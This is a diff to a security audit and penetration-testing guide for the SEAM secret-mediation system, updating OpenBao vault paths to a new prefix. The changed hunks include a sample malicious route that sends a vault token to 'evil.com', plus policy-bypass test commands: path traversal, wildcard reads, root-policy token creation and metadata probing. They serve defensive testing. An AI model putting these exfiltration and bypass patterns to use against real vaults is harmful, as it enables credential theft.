@@ -4,9 +4,18 @@
 
 This guide provides comprehensive procedures for auditing and penetration testing SEAM's secret mediation system to validate that secrets never leak in any context. It addresses the critical security requirements established after the 2026-08-09 token leak incident.
 
-**Last Updated:** 2026-08-15  
+**Last Updated:** 2026-09-05  
 **Bead:** seam-764b4829  
 **Priority:** P1 (Critical)
+
+> **Vault base in force:** SEAM's enforced prefix is
+> `rs-manager/rs-manager/seam/routes` (`internal/spec/allowlist.go`
+> `DefaultVaultBaseDir`; `SEAM_VAULT_BASE_DIR` overrides). Every attack path
+> below is aimed at that prefix. The earlier cluster-agnostic base
+> `seam/routes` is **retired** (consolidated 2026-09-04): with
+> `SEAM_VAULT_BASE_DIR` unset the runtime enforcer rejects it, so an attempt
+> under the old base now fails validation rather than reaching a policy
+> decision. Retest both if your deployment still carries the legacy policies.
 
 ## Critical Security Context
 
@@ -275,7 +284,7 @@ set -e
 
 OPENBAO_ADDR="http://openbao-rs-manager.openbao.svc.cluster.local:8200"
 EVALUATOR_TOKEN_PATH="evaluators/seam-retirement-evaluator/github-token"
-SEAM_ROUTE_PATH="seam/routes/test-route/token"
+SEAM_ROUTE_PATH="rs-manager/rs-manager/seam/routes/test-route/token"
 
 echo "=== OpenBao Policy Enforcement Test ==="
 
@@ -324,7 +333,7 @@ grep -q "evaluators.*deny" /tmp/seam-policy.txt || echo "❌ Missing evaluators 
 grep -q "secret/data/\*.*deny" /tmp/seam-policy.txt || echo "❌ Missing default-deny in SEAM policy"
 
 echo "Checking Evaluator policy deny rules..."
-grep -q "seam/routes.*deny" /tmp/eval-policy.txt || echo "❌ Missing seam/routes deny in Evaluator policy"
+grep -q "rs-manager/rs-manager/seam/routes.*deny" /tmp/eval-policy.txt || echo "❌ Missing rs-manager/rs-manager/seam/routes deny in Evaluator policy"
 grep -q "secret/data/\*.*deny" /tmp/eval-policy.txt || echo "❌ Missing default-deny in Evaluator policy"
 ```
 
@@ -388,7 +397,7 @@ func TestTokenRevocation(t *testing.T) {
     
     // Verify token cannot access secrets after revocation
     client := openbao.NewClient(testOpenBaoAddr, token)
-    _, err := client.ReadSecret(ctx, "seam/routes/test/token")
+    _, err := client.ReadSecret(ctx, "rs-manager/rs-manager/seam/routes/test/token")
     if err == nil {
         t.Fatal("REVOKED TOKEN CAN STILL ACCESS SECRETS (SECURITY BREACH)")
     }
@@ -603,7 +612,7 @@ func TestResponsesContainOnlyReferences(t *testing.T) {
     - path: /exfil-dns
       method: POST
       openbao:
-        path: seam/routes/github-alerts/token  # Try to access SEAM secret
+        path: rs-manager/rs-manager/seam/routes/github-alerts/token  # Try to access SEAM secret
       backend:
         url: "http://evil.com/collect?secret={{openbao.token}}"
         
@@ -624,7 +633,7 @@ func TestResponsesContainOnlyReferences(t *testing.T) {
     - path: /log-inject
       method: POST
       openbao:
-        path: seam/routes/test/token
+        path: rs-manager/rs-manager/seam/routes/test/token
       backend:
         url: "http://localhost:8080/log?level=debug&secret={{openbao.token}}"
 ```
@@ -730,11 +739,11 @@ echo "=== OpenBao Policy Bypass Penetration Test ==="
 
 # Attack 1: Path traversal attempt
 echo "Attack 1: Path traversal in secret path..."
-bao kv get seam/routes/../../../evaluators/seam-retirement-evaluator/github-token 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
+bao kv get rs-manager/rs-manager/seam/routes/../../../evaluators/seam-retirement-evaluator/github-token 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
 
 # Attack 2: Policy wildcard exploit
 echo "Attack 2: Wildcard path expansion..."
-bao kv get "seam/routes/*" 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
+bao kv get "rs-manager/rs-manager/seam/routes/*" 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
 
 # Attack 3: Token escalation attempt
 echo "Attack 3: Token privilege escalation..."
@@ -743,7 +752,7 @@ bao write auth/token/create policies=seam,root ttl=24h 2>&1 | grep -i "permissio
 
 # Attack 4: Metadata endpoint exploitation
 echo "Attack 4: Metadata endpoint exploitation..."
-bao kv get metadata/seam/routes 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
+bao kv get metadata/rs-manager/rs-manager/seam/routes 2>&1 | grep -i "permission denied" || echo "BYPASS ATTEMPT SUCCEEDED"
 
 echo "=== OpenBao bypass pen-test complete ==="
 ```
@@ -819,7 +828,7 @@ spec:
           # Test SEAM policy
           bao kv get evaluators/seam-retirement-evaluator/github-token 2>&1 | grep -i "permission denied"
           # Test Evaluator policy  
-          bao kv get seam/routes/test/token 2>&1 | grep -i "permission denied"
+          bao kv get rs-manager/rs-manager/seam/routes/test/token 2>&1 | grep -i "permission denied"
           echo "✓ Policy enforcement check passed"
           
   - name: reference-only-check
@@ -908,7 +917,7 @@ spec:
    # Rotate all potentially compromised secrets
    for secret_path in \
      "evaluators/seam-retirement-evaluator/github-token" \
-     "seam/routes/*/token" \
+     "rs-manager/rs-manager/seam/routes/*/token" \
      "monitoring/victoriametrics/readonly-credentials"
    do
      echo "Rotating secret: $secret_path"
